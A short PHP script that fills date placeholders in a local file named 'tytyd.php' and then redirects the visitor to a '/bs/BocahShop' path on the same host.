<?php
error_reporting(0);

$file = @file_get_contents("tytyd.php");
$tgl = date("d-m-Y");
$file = str_replace("bocahawal",$tgl,$file);
$buka = fopen("tytyd.php","w");

fwrite($buka,$file);
fclose($buka);


$file2 = @file_get_contents("tytyd.php");
$tgl2 = date("D, d F Y H:i");
$file2 = str_replace("bocahorder",$tgl2,$file2);
$buka2 = fopen("tytyd.php","w");

fwrite($buka2,$file2);
fclose($buka2);

echo "<meta http-equiv='refresh' content='0; url=https://".$_SERVER['HTTP_HOST']."/bs/BocahShop'/>";